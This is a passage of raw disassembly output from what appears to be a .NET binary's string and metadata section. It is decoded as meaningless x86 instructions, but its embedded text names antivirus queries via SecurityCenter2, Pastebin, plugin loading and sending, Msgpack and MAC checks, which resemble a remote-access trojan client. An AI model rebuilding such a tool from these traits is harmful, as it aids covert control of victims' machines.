  40c441:	65 00 00             	add    %al,%gs:(%eax)
  40c444:	0b 33                	or     (%ebx),%esi
  40c446:	00 32                	add    %dh,(%edx)
  40c448:	00 62 00             	add    %ah,0x0(%edx)
  40c44b:	69 00 74 00 00 09    	imul   $0x9000074,(%eax),%eax
  40c451:	50                   	push   %eax
  40c452:	00 61 00             	add    %ah,0x0(%ecx)
  40c455:	74 00                	je     0x40c457
  40c457:	68 00 00 0f 56       	push   $0x560f0000
  40c45c:	00 65 00             	add    %ah,0x0(%ebp)
  40c45f:	72 00                	jb     0x40c461
  40c461:	73 00                	jae    0x40c463
  40c463:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40c469:	00 0b                	add    %cl,(%ebx)
  40c46b:	41                   	inc    %ecx
  40c46c:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40c470:	00 69 00             	add    %ch,0x0(%ecx)
  40c473:	6e                   	outsb  %ds:(%esi),(%dx)
  40c474:	00 00                	add    %al,(%eax)
  40c476:	09 74 00 72          	or     %esi,0x72(%eax,%eax,1)
  40c47a:	00 75 00             	add    %dh,0x0(%ebp)
  40c47d:	65 00 00             	add    %al,%gs:(%eax)
  40c480:	0b 66 00             	or     0x0(%esi),%esp
  40c483:	61                   	popa
  40c484:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  40c488:	00 65 00             	add    %ah,0x0(%ebp)
  40c48b:	00 17                	add    %dl,(%edi)
  40c48d:	50                   	push   %eax
  40c48e:	00 65 00             	add    %ah,0x0(%ebp)
  40c491:	72 00                	jb     0x40c493
  40c493:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40c497:	72 00                	jb     0x40c499
  40c499:	6d                   	insl   (%dx),%es:(%edi)
  40c49a:	00 61 00             	add    %ah,0x0(%ecx)
  40c49d:	6e                   	outsb  %ds:(%esi),(%dx)
  40c49e:	00 63 00             	add    %ah,0x0(%ebx)
  40c4a1:	65 00 00             	add    %al,%gs:(%eax)
  40c4a4:	11 50 00             	adc    %edx,0x0(%eax)
  40c4a7:	61                   	popa
  40c4a8:	00 73 00             	add    %dh,0x0(%ebx)
  40c4ab:	74 00                	je     0x40c4ad
  40c4ad:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  40c4b1:	69 00 6e 00 00 13    	imul   $0x1300006e,(%eax),%eax
  40c4b7:	41                   	inc    %ecx
  40c4b8:	00 6e 00             	add    %ch,0x0(%esi)
  40c4bb:	74 00                	je     0x40c4bd
  40c4bd:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40c4c3:	72 00                	jb     0x40c4c5
  40c4c5:	75 00                	jne    0x40c4c7
  40c4c7:	73 00                	jae    0x40c4c9
  40c4c9:	00 13                	add    %dl,(%ebx)
  40c4cb:	49                   	dec    %ecx
  40c4cc:	00 6e 00             	add    %ch,0x0(%esi)
  40c4cf:	73 00                	jae    0x40c4d1
  40c4d1:	74 00                	je     0x40c4d3
  40c4d3:	61                   	popa
  40c4d4:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40c4d8:	00 65 00             	add    %ah,0x0(%ebp)
  40c4db:	64 00 00             	add    %al,%fs:(%eax)
  40c4de:	09 50 00             	or     %edx,0x0(%eax)
  40c4e1:	6f                   	outsl  %ds:(%esi),(%dx)
  40c4e2:	00 6e 00             	add    %ch,0x0(%esi)
  40c4e5:	67 00 00             	add    %al,(%bx,%si)
  40c4e8:	0b 47 00             	or     0x0(%edi),%eax
  40c4eb:	72 00                	jb     0x40c4ed
  40c4ed:	6f                   	outsl  %ds:(%esi),(%dx)
  40c4ee:	00 75 00             	add    %dh,0x0(%ebp)
  40c4f1:	70 00                	jo     0x40c4f3
  40c4f3:	00 05 5c 00 5c 00    	add    %al,0x5c005c
  40c4f9:	00 2b                	add    %ch,(%ebx)
  40c4fb:	5c                   	pop    %esp
  40c4fc:	00 72 00             	add    %dh,0x0(%edx)
  40c4ff:	6f                   	outsl  %ds:(%esi),(%dx)
  40c500:	00 6f 00             	add    %ch,0x0(%edi)
  40c503:	74 00                	je     0x40c505
  40c505:	5c                   	pop    %esp
  40c506:	00 53 00             	add    %dl,0x0(%ebx)
  40c509:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c50d:	75 00                	jne    0x40c50f
  40c50f:	72 00                	jb     0x40c511
  40c511:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  40c517:	43                   	inc    %ebx
  40c518:	00 65 00             	add    %ah,0x0(%ebp)
  40c51b:	6e                   	outsb  %ds:(%esi),(%dx)
  40c51c:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40c520:	00 72 00             	add    %dh,0x0(%edx)
  40c523:	32 00                	xor    (%eax),%al
  40c525:	00 3d 53 00 65 00    	add    %bh,0x650053
  40c52b:	6c                   	insb   (%dx),%es:(%edi)
  40c52c:	00 65 00             	add    %ah,0x0(%ebp)
  40c52f:	63 00                	arpl   %eax,(%eax)
  40c531:	74 00                	je     0x40c533
  40c533:	20 00                	and    %al,(%eax)
  40c535:	2a 00                	sub    (%eax),%al
  40c537:	20 00                	and    %al,(%eax)
  40c539:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40c53d:	6f                   	outsl  %ds:(%esi),(%dx)
  40c53e:	00 6d 00             	add    %ch,0x0(%ebp)
  40c541:	20 00                	and    %al,(%eax)
  40c543:	41                   	inc    %ecx
  40c544:	00 6e 00             	add    %ch,0x0(%esi)
  40c547:	74 00                	je     0x40c549
  40c549:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40c54f:	72 00                	jb     0x40c551
  40c551:	75 00                	jne    0x40c553
  40c553:	73 00                	jae    0x40c555
  40c555:	50                   	push   %eax
  40c556:	00 72 00             	add    %dh,0x0(%edx)
  40c559:	6f                   	outsl  %ds:(%esi),(%dx)
  40c55a:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40c55e:	00 63 00             	add    %ah,0x0(%ebx)
  40c561:	74 00                	je     0x40c563
  40c563:	00 17                	add    %dl,(%edi)
  40c565:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40c569:	73 00                	jae    0x40c56b
  40c56b:	70 00                	jo     0x40c56d
  40c56d:	6c                   	insb   (%dx),%es:(%edi)
  40c56e:	00 61 00             	add    %ah,0x0(%ecx)
  40c571:	79 00                	jns    0x40c573
  40c573:	4e                   	dec    %esi
  40c574:	00 61 00             	add    %ah,0x0(%ecx)
  40c577:	6d                   	insl   (%dx),%es:(%edi)
  40c578:	00 65 00             	add    %ah,0x0(%ebp)
  40c57b:	00 07                	add    %al,(%edi)
  40c57d:	4e                   	dec    %esi
  40c57e:	00 2f                	add    %ch,(%edi)
  40c580:	00 41 00             	add    %al,0x0(%ecx)
  40c583:	00 05 2c 00 20 00    	add    %al,0x20002c
  40c589:	00 13                	add    %dl,(%ebx)
  40c58b:	53                   	push   %ebx
  40c58c:	00 6f 00             	add    %ch,0x0(%edi)
  40c58f:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  40c594:	00 61 00             	add    %ah,0x0(%ecx)
  40c597:	72 00                	jb     0x40c599
  40c599:	65 00 5c 00 00       	add    %bl,%gs:0x0(%eax,%eax,1)
  40c59e:	09 70 00             	or     %esi,0x0(%eax)
  40c5a1:	6f                   	outsl  %ds:(%esi),(%dx)
  40c5a2:	00 6e 00             	add    %ch,0x0(%esi)
  40c5a5:	67 00 00             	add    %al,(%bx,%si)
  40c5a8:	0d 70 00 6c 00       	or     $0x6c0070,%eax
  40c5ad:	75 00                	jne    0x40c5af
  40c5af:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40c5b3:	6e                   	outsb  %ds:(%esi),(%dx)
  40c5b4:	00 00                	add    %al,(%eax)
  40c5b6:	15 73 00 61 00       	adc    $0x610073,%eax
  40c5bb:	76 00                	jbe    0x40c5bd
  40c5bd:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40c5c1:	6c                   	insb   (%dx),%es:(%edi)
  40c5c2:	00 75 00             	add    %dh,0x0(%ebp)
  40c5c5:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40c5c9:	6e                   	outsb  %ds:(%esi),(%dx)
  40c5ca:	00 00                	add    %al,(%eax)
  40c5cc:	07                   	pop    %es
  40c5cd:	44                   	inc    %esp
  40c5ce:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40c5d2:	00 00                	add    %al,(%eax)
  40c5d4:	15 73 00 65 00       	adc    $0x650073,%eax
  40c5d9:	6e                   	outsb  %ds:(%esi),(%dx)
  40c5da:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  40c5de:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40c5e2:	00 67 00             	add    %ah,0x0(%edi)
  40c5e5:	69 00 6e 00 00 0d    	imul   $0xd00006e,(%eax),%eax
  40c5eb:	48                   	dec    %eax
  40c5ec:	00 61 00             	add    %ah,0x0(%ecx)
  40c5ef:	73 00                	jae    0x40c5f1
  40c5f1:	68 00 65 00 73       	push   $0x73006500
  40c5f6:	00 00                	add    %al,(%eax)
  40c5f8:	09 48 00             	or     %ecx,0x0(%eax)
  40c5fb:	61                   	popa
  40c5fc:	00 73 00             	add    %dh,0x0(%ebx)
  40c5ff:	68 00 00 1b 50       	push   $0x501b0000
  40c604:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40c608:	00 67 00             	add    %ah,0x0(%edi)
  40c60b:	69 00 6e 00 2e 00    	imul   $0x2e006e,(%eax),%eax
  40c611:	50                   	push   %eax
  40c612:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40c616:	00 67 00             	add    %ah,0x0(%edi)
  40c619:	69 00 6e 00 00 07    	imul   $0x700006e,(%eax),%eax
  40c61f:	52                   	push   %edx
  40c620:	00 75 00             	add    %dh,0x0(%ebp)
  40c623:	6e                   	outsb  %ds:(%esi),(%dx)
  40c624:	00 00                	add    %al,(%eax)
  40c626:	0f 4d 00             	cmovge (%eax),%eax
  40c629:	73 00                	jae    0x40c62b
  40c62b:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  40c62f:	61                   	popa
  40c630:	00 63 00             	add    %ah,0x0(%ebx)
  40c633:	6b 00 00             	imul   $0x0,(%eax),%eax
  40c636:	11 52 00             	adc    %edx,0x0(%edx)
  40c639:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c63d:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40c641:	76 00                	jbe    0x40c643
  40c643:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  40c648:	0b 45 00             	or     0x0(%ebp),%eax
  40c64b:	72 00                	jb     0x40c64d
  40c64d:	72 00                	jb     0x40c64f
  40c64f:	6f                   	outsl  %ds:(%esi),(%dx)
  40c650:	00 72 00             	add    %dh,0x0(%edx)
  40c653:	00 47 6d             	add    %al,0x6d(%edi)
  40c656:	00 61 00             	add    %ah,0x0(%ecx)
  40c659:	73 00                	jae    0x40c65b
  40c65b:	74 00                	je     0x40c65d
  40c65d:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c661:	4b                   	dec    %ebx
  40c662:	00 65 00             	add    %ah,0x0(%ebp)
  40c665:	79 00                	jns    0x40c667
  40c667:	20 00                	and    %al,(%eax)
  40c669:	63 00                	arpl   %eax,(%eax)
  40c66b:	61                   	popa
  40c66c:	00 6e 00             	add    %ch,0x0(%esi)
  40c66f:	20 00                	and    %al,(%eax)
  40c671:	6e                   	outsb  %ds:(%esi),(%dx)
  40c672:	00 6f 00             	add    %ch,0x0(%edi)
  40c675:	74 00                	je     0x40c677
  40c677:	20 00                	and    %al,(%eax)
  40c679:	62 00                	bound  %eax,(%eax)
  40c67b:	65 00 20             	add    %ah,%gs:(%eax)
  40c67e:	00 6e 00             	add    %ch,0x0(%esi)
  40c681:	75 00                	jne    0x40c683
  40c683:	6c                   	insb   (%dx),%es:(%edi)
  40c684:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  40c688:	00 6f 00             	add    %ch,0x0(%edi)
  40c68b:	72 00                	jb     0x40c68d
  40c68d:	20 00                	and    %al,(%eax)
  40c68f:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40c693:	70 00                	jo     0x40c695
  40c695:	74 00                	je     0x40c697
  40c697:	79 00                	jns    0x40c699
  40c699:	2e 00 00             	add    %al,%cs:(%eax)
  40c69c:	2d 69 00 6e 00       	sub    $0x6e0069,%eax
  40c6a1:	70 00                	jo     0x40c6a3
  40c6a3:	75 00                	jne    0x40c6a5
  40c6a5:	74 00                	je     0x40c6a7
  40c6a7:	20 00                	and    %al,(%eax)
  40c6a9:	63 00                	arpl   %eax,(%eax)
  40c6ab:	61                   	popa
  40c6ac:	00 6e 00             	add    %ch,0x0(%esi)
  40c6af:	20 00                	and    %al,(%eax)
  40c6b1:	6e                   	outsb  %ds:(%esi),(%dx)
  40c6b2:	00 6f 00             	add    %ch,0x0(%edi)
  40c6b5:	74 00                	je     0x40c6b7
  40c6b7:	20 00                	and    %al,(%eax)
  40c6b9:	62 00                	bound  %eax,(%eax)
  40c6bb:	65 00 20             	add    %ah,%gs:(%eax)
  40c6be:	00 6e 00             	add    %ch,0x0(%esi)
  40c6c1:	75 00                	jne    0x40c6c3
  40c6c3:	6c                   	insb   (%dx),%es:(%edi)
  40c6c4:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40c6c8:	00 00                	add    %al,(%eax)
  40c6ca:	55                   	push   %ebp
  40c6cb:	49                   	dec    %ecx
  40c6cc:	00 6e 00             	add    %ch,0x0(%esi)
  40c6cf:	76 00                	jbe    0x40c6d1
  40c6d1:	61                   	popa
  40c6d2:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40c6d6:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40c6da:	00 6d 00             	add    %ch,0x0(%ebp)
  40c6dd:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40c6e1:	73 00                	jae    0x40c6e3
  40c6e3:	61                   	popa
  40c6e4:	00 67 00             	add    %ah,0x0(%edi)
  40c6e7:	65 00 20             	add    %ah,%gs:(%eax)
  40c6ea:	00 61 00             	add    %ah,0x0(%ecx)
  40c6ed:	75 00                	jne    0x40c6ef
  40c6ef:	74 00                	je     0x40c6f1
  40c6f1:	68 00 65 00 6e       	push   $0x6e006500
  40c6f6:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40c6fa:	00 63 00             	add    %ah,0x0(%ebx)
  40c6fd:	61                   	popa
  40c6fe:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40c702:	00 6f 00             	add    %ch,0x0(%edi)
  40c705:	6e                   	outsb  %ds:(%esi),(%dx)
  40c706:	00 20                	add    %ah,(%eax)
  40c708:	00 63 00             	add    %ah,0x0(%ebx)
  40c70b:	6f                   	outsl  %ds:(%esi),(%dx)
  40c70c:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40c710:	00 20                	add    %ah,(%eax)
  40c712:	00 28                	add    %ch,(%eax)
  40c714:	00 4d 00             	add    %cl,0x0(%ebp)
  40c717:	41                   	inc    %ecx
  40c718:	00 43 00             	add    %al,0x0(%ebx)
  40c71b:	29 00                	sub    %eax,(%eax)
  40c71d:	2e 00 00             	add    %al,%cs:(%eax)
  40c720:	05 58 00 32 00       	add    $0x320058,%eax
  40c725:	00 0f                	add    %cl,(%edi)
  40c727:	7b 00                	jnp    0x40c729
  40c729:	30 00                	xor    %al,(%eax)
  40c72b:	3a 00                	cmp    (%eax),%al
  40c72d:	44                   	inc    %esp
  40c72e:	00 33                	add    %dh,(%ebx)
  40c730:	00 7d 00             	add    %bh,0x0(%ebp)
  40c733:	20 00                	and    %al,(%eax)
  40c735:	00 0f                	add    %cl,(%edi)
  40c737:	7b 00                	jnp    0x40c739
  40c739:	30 00                	xor    %al,(%eax)
  40c73b:	3a 00                	cmp    (%eax),%al
  40c73d:	58                   	pop    %eax
  40c73e:	00 32                	add    %dh,(%edx)
  40c740:	00 7d 00             	add    %bh,0x0(%ebp)
  40c743:	20 00                	and    %al,(%eax)
  40c745:	00 2b                	add    %ch,(%ebx)
  40c747:	28 00                	sub    %al,(%eax)
  40c749:	6e                   	outsb  %ds:(%esi),(%dx)
  40c74a:	00 65 00             	add    %ah,0x0(%ebp)
  40c74d:	76 00                	jbe    0x40c74f
  40c74f:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c753:	20 00                	and    %al,(%eax)
  40c755:	75 00                	jne    0x40c757
  40c757:	73 00                	jae    0x40c759
  40c759:	65 00 64 00 29       	add    %ah,%gs:0x29(%eax,%eax,1)
  40c75e:	00 20                	add    %ah,(%eax)
  40c760:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  40c764:	00 70 00             	add    %dh,0x0(%eax)
  40c767:	65 00 20             	add    %ah,%gs:(%eax)
  40c76a:	00 24 00             	add    %ah,(%eax,%eax,1)
  40c76d:	63 00                	arpl   %eax,(%eax)
  40c76f:	31 00                	xor    %eax,(%eax)
  40c771:	00 45 28             	add    %al,0x28(%ebp)
  40c774:	00 65 00             	add    %ah,0x0(%ebp)
  40c777:	78 00                	js     0x40c779
  40c779:	74 00                	je     0x40c77b
  40c77b:	38 00                	cmp    %al,(%eax)
  40c77d:	2c 00                	sub    $0x0,%al
  40c77f:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40c783:	74 00                	je     0x40c785
  40c785:	31 00                	xor    %eax,(%eax)
  40c787:	36 00 2c 00          	add    %ch,%ss:(%eax,%eax,1)
  40c78b:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40c78f:	33 00                	xor    (%eax),%eax
  40c791:	32 00                	xor    (%eax),%al
  40c793:	29 00                	sub    %eax,(%eax)
  40c795:	20 00                	and    %al,(%eax)
  40c797:	74 00                	je     0x40c799
  40c799:	79 00                	jns    0x40c79b
  40c79b:	70 00                	jo     0x40c79d
  40c79d:	65 00 20             	add    %ah,%gs:(%eax)
  40c7a0:	00 24 00             	add    %ah,(%eax,%eax,1)
  40c7a3:	63 00                	arpl   %eax,(%eax)
  40c7a5:	37                   	aaa
  40c7a6:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40c7a9:	24 00                	and    $0x0,%al
  40c7ab:	63 00                	arpl   %eax,(%eax)
  40c7ad:	38 00                	cmp    %al,(%eax)
  40c7af:	2c 00                	sub    $0x0,%al
  40c7b1:	24 00                	and    $0x0,%al
  40c7b3:	63 00                	arpl   %eax,(%eax)
  40c7b5:	39 00                	cmp    %eax,(%eax)
  40c7b7:	00 14 74             	add    %dl,(%esp,%esi,2)
  40c7ba:	6b 73 7b 88          	imul   $0xffffff88,0x7b(%ebx),%esi
  40c7be:	11 4e 8d             	adc    %ecx,-0x73(%esi)
  40c7c1:	24 f5                	and    $0xf5,%al
  40c7c3:	ac                   	lods   %ds:(%esi),%al
  40c7c4:	9a d7 a1 0a 00 08 b7 	lcall  $0xb708,$0xaa1d7
  40c7cb:	7a 5c                	jp     0x40c829
  40c7cd:	56                   	push   %esi
  40c7ce:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  40c7d1:	89 03                	mov    %eax,(%ebx)
  40c7d3:	00 00                	add    %al,(%eax)
  40c7d5:	01 03                	add    %eax,(%ebx)
  40c7d7:	20 00                	and    %al,(%eax)
  40c7d9:	01 02                	add    %eax,(%edx)
  40c7db:	06                   	push   %es
  40c7dc:	0e                   	push   %cs
  40c7dd:	03 06                	add    (%esi),%eax
  40c7df:	12 09                	adc    (%ecx),%cl
  40c7e1:	03 06                	add    (%esi),%eax
  40c7e3:	12 44 03 00          	adc    0x0(%ebx,%eax,1),%al
  40c7e7:	00 02                	add    %al,(%edx)
  40c7e9:	03 06                	add    (%esi),%eax
  40c7eb:	12 0d 03 06 12 11    	adc    0x11120603,%cl
  40c7f1:	03 06                	add    (%esi),%eax
  40c7f3:	1d 05 02 06 0a       	sbb    $0xa060205,%eax
  40c7f8:	03 06                	add    (%esi),%eax
  40c7fa:	12 15 02 06 02 02    	adc    0x2020602,%dl
  40c800:	06                   	push   %es
  40c801:	1c 02                	sbb    $0x2,%al
  40c803:	06                   	push   %es
  40c804:	08 04 00             	or     %al,(%eax,%eax,1)
  40c807:	00 12                	add    %dl,(%edx)
  40c809:	0d 05 00 01 01       	or     $0x1010005,%eax
  40c80e:	12 0d 04 00 00 12    	adc    0x12000004,%cl
  40c814:	11 05 00 01 01 12    	adc    %eax,0x12010100
  40c81a:	11 04 00             	adc    %eax,(%eax,%eax,1)
  40c81d:	00 1d 05 05 00 01    	add    %bl,0x1000505
  40c823:	01 1d 05 03 00 00    	add    %ebx,0x305
  40c829:	0a 04 00             	or     (%eax,%eax,1),%al
  40c82c:	01 01                	add    %eax,(%ecx)
  40c82e:	0a 04 00             	or     (%eax,%eax,1),%al
  40c831:	00 12                	add    %dl,(%edx)
  40c833:	15 05 00 01 01       	adc    $0x1010005,%eax
  40c838:	12 15 04 00 01 01    	adc    0x1010004,%dl
  40c83e:	02 03                	add    (%ebx),%al
  40c840:	00 00                	add    %al,(%eax)
  40c842:	1c 03                	sbb    $0x3,%al
  40c844:	00 00                	add    %al,(%eax)
  40c846:	08 04 00             	or     %al,(%eax,%eax,1)
  40c849:	01 01                	add    %eax,(%ecx)
  40c84b:	08 04 00             	or     %al,(%eax,%eax,1)
  40c84e:	01 02                	add    %eax,(%edx)
  40c850:	0e                   	push   %cs
  40c851:	0a 00                	or     (%eax),%al
  40c853:	04 02                	add    $0x2,%al
  40c855:	1c 12                	sbb    $0x12,%al
  40c857:	19 12                	sbb    %edx,(%edx)
  40c859:	1d 11 21 05 00       	sbb    $0x52111,%eax
  40c85e:	01 01                	add    %eax,(%ecx)
  40c860:	12 25 04 00 01 01    	adc    0x1010004,%ah
  40c866:	1c 04                	sbb    $0x4,%al
  40c868:	08 00                	or     %al,(%eax)
  40c86a:	12 0d 04 08 00 12    	adc    0x12000804,%cl
  40c870:	11 04 08             	adc    %eax,(%eax,%ecx,1)
  40c873:	00 1d 05 03 08 00    	add    %bl,0x80305
  40c879:	0a 04 08             	or     (%eax,%ecx,1),%al
  40c87c:	00 12                	add    %dl,(%edx)
  40c87e:	15 03 08 00 02       	adc    $0x2000803,%eax
  40c883:	03 08                	add    (%eax),%ecx
  40c885:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40c888:	08 00                	or     %al,(%eax)
  40c88a:	08 03                	or     %al,(%ebx)
  40c88c:	00 00                	add    %al,(%eax)
  40c88e:	0e                   	push   %cs
  40c88f:	04 00                	add    $0x0,%al
  40c891:	01 0e                	add    %ecx,(%esi)
  40c893:	0e                   	push   %cs
  40c894:	08 b0 3f 5f 7f 11    	or     %dh,0x117f5f3f(%eax)
  40c89a:	d5 0a                	aad    $0xa
  40c89c:	3a 06                	cmp    (%esi),%al
  40c89e:	00 01                	add    %al,(%ecx)
  40c8a0:	12 29                	adc    (%ecx),%ch
  40c8a2:	12 2d 03 06 12 31    	adc    0x31120603,%ch
  40c8a8:	03 00                	add    (%eax),%eax
  40c8aa:	00 18                	add    %bl,(%eax)
  40c8ac:	07                   	pop    %es
  40c8ad:	00 03                	add    %al,(%ebx)
  40c8af:	08 18                	or     %bl,(%eax)
  40c8b1:	12 35 08 04 00 01    	adc    0x1000408,%dh
  40c8b7:	18 0e                	sbb    %cl,(%esi)
  40c8b9:	06                   	push   %es
  40c8ba:	00 02                	add    %al,(%edx)
  40c8bc:	02 18                	add    (%eax),%bl
  40c8be:	10 02                	adc    %al,(%edx)
  40c8c0:	06                   	push   %es
  40c8c1:	00 01                	add    %al,(%ecx)
  40c8c3:	11 30                	adc    %esi,(%eax)
  40c8c5:	11 30                	adc    %esi,(%eax)
  40c8c7:	06                   	push   %es
  40c8c8:	00 03                	add    %al,(%ebx)
  40c8ca:	01 09                	add    %ecx,(%ecx)
  40c8cc:	09 09                	or     %ecx,(%ecx)
  40c8ce:	02 06                	add    (%esi),%al
  40c8d0:	09 03                	or     %eax,(%ebx)
  40c8d2:	06                   	push   %es
  40c8d3:	11 30                	adc    %esi,(%eax)
  40c8d5:	04 00                	add    $0x0,%al
  40c8d7:	00 00                	add    %al,(%eax)
  40c8d9:	80 04 02 00          	addb   $0x0,(%edx,%eax,1)
  40c8dd:	00 00                	add    %al,(%eax)
  40c8df:	04 01                	add    $0x1,%al
  40c8e1:	00 00                	add    %al,(%eax)
  40c8e3:	00 06                	add    %al,(%esi)
  40c8e5:	00 02                	add    %al,(%edx)
  40c8e7:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40c8ea:	3d 06 00 02 02       	cmp    $0x2020006,%eax
  40c8ef:	0e                   	push   %cs
  40c8f0:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40c8f5:	1d 05 0e 07 06       	sbb    $0x6070e05,%eax
  40c8fa:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c8ff:	60                   	pusha
  40c900:	05 00 01 01 12       	add    $0x12010100,%eax
  40c905:	60                   	pusha
  40c906:	04 00                	add    $0x0,%al
  40c908:	01 01                	add    %eax,(%ecx)
  40c90a:	0e                   	push   %cs
  40c90b:	18 06                	sbb    %al,(%esi)
  40c90d:	15 12 45 01 15       	adc    $0x15014512,%eax
  40c912:	12 49 0a             	adc    0xa(%ecx),%cl
  40c915:	12 4d 1c             	adc    0x1c(%ebp),%cl
  40c918:	12 0d 12 09 0e 1d    	adc    0x1d0e0912,%cl
  40c91e:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40c923:	0e                   	push   %cs
  40c924:	04 20                	add    $0x20,%al
  40c926:	00 00                	add    %al,(%eax)
  40c928:	00 04 40             	add    %al,(%eax,%eax,2)
  40c92b:	00 00                	add    %al,(%eax)
  40c92d:	00 04 10             	add    %al,(%eax,%edx,1)
  40c930:	00 00                	add    %al,(%eax)
  40c932:	00 04 20             	add    %al,(%eax,%eiz,1)
  40c935:	01 01                	add    %eax,(%ecx)
  40c937:	0e                   	push   %cs
  40c938:	04 20                	add    $0x20,%al
  40c93a:	01 0e                	add    %ecx,(%esi)
  40c93c:	0e                   	push   %cs
  40c93d:	06                   	push   %es
  40c93e:	20 01                	and    %al,(%ecx)
  40c940:	1d 05 1d 05 07       	sbb    $0x7051d05,%eax
  40c945:	20 02                	and    %al,(%edx)
  40c947:	02 1d 05 1d 05 06    	add    0x6051d05,%bl
  40c94d:	00 01                	add    %al,(%ecx)
  40c94f:	1d 05 1d 05 03       	sbb    $0x3051d05,%eax
  40c954:	06                   	push   %es
  40c955:	11 50 03             	adc    %edx,0x3(%eax)
  40c958:	06                   	push   %es
  40c959:	12 55 05             	adc    0x5(%ebp),%dl
  40c95c:	00 01                	add    %al,(%ecx)
  40c95e:	0e                   	push   %cs
  40c95f:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40c964:	1d 05 0a 05 00       	sbb    $0x50a05,%eax
  40c969:	01 1d 05 08 05 00    	add    %ebx,0x50805
  40c96f:	01 1d 05 06 05 00    	add    %ebx,0x50605
  40c975:	01 1d 05 0d 09 20    	add    %ebx,0x20090d05
  40c97b:	01 01                	add    %eax,(%ecx)
  40c97d:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c982:	60                   	pusha
  40c983:	03 20                	add    (%eax),%esp
  40c985:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40c988:	20 00                	and    %al,(%eax)
  40c98a:	02 03                	add    (%ebx),%al
  40c98c:	28 00                	sub    %al,(%eax)
  40c98e:	1c 03                	sbb    $0x3,%al
  40c990:	06                   	push   %es
  40c991:	12 60 0b             	adc    0xb(%eax),%ah
  40c994:	20 02                	and    %al,(%edx)
  40c996:	01 12                	add    %edx,(%edx)
  40c998:	60                   	pusha
  40c999:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c99e:	60                   	pusha
  40c99f:	04 20                	add    $0x20,%al
  40c9a1:	00 12                	add    %dl,(%edx)
  40c9a3:	60                   	pusha
  40c9a4:	05 20 01 12 60       	add    $0x60120120,%eax
  40c9a9:	0e                   	push   %cs
  40c9aa:	05 20 01 12 60       	add    $0x60120120,%eax
  40c9af:	0a 05 20 01 12 60    	or     0x60120120,%al
  40c9b5:	0d 05 20 01 12       	or     $0x12012005,%eax
  40c9ba:	60                   	pusha
  40c9bb:	08 03                	or     %al,(%ebx)
  40c9bd:	20 00                	and    %al,(%eax)
  40c9bf:	08 05 28 01 12 60    	or     %al,0x60120128
  40c9c5:	08 03                	or     %al,(%ebx)
  40c9c7:	28 00                	sub    %al,(%eax)
  40c9c9:	08 03                	or     %al,(%ebx)
  40c9cb:	06                   	push   %es
  40c9cc:	11 64 03 06          	adc    %esp,0x6(%ebx,%eax,1)
  40c9d0:	12 5c 04 20          	adc    0x20(%esp,%eax,1),%bl
  40c9d4:	01 08                	add    %ecx,(%eax)
  40c9d6:	0e                   	push   %cs
  40c9d7:	05 20 01 01 12       	add    $0x12010120,%eax
  40c9dc:	61                   	popa
  40c9dd:	04 20                	add    $0x20,%al
  40c9df:	01 01                	add    %eax,(%ecx)
  40c9e1:	0a 04 20             	or     (%eax,%eiz,1),%al
  40c9e4:	01 01                	add    %eax,(%ecx)
  40c9e6:	0b 03                	or     (%ebx),%eax
  40c9e8:	20 00                	and    %al,(%eax)
  40c9ea:	0b 03                	or     (%ebx),%eax
  40c9ec:	20 00                	and    %al,(%eax)
  40c9ee:	0a 03                	or     (%ebx),%al
  40c9f0:	20 00                	and    %al,(%eax)
  40c9f2:	0d 05 20 01 01       	or     $0x1012005,%eax
  40c9f7:	1d 05 04 20 00       	sbb    $0x200405,%eax
  40c9fc:	1d 05 05 20 02       	sbb    $0x2200505,%eax
